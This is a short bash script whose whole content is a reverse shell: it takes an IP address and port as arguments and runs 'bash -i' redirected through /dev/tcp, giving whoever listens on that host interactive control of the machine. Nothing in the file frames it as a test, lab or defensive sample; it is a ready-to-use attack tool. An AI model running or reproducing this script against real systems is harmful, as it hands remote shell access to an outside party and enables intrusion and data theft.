#!/bin/bash

ip=$1
port=$2

bash -i >& /dev/tcp/${ip}/${port} 0>&1
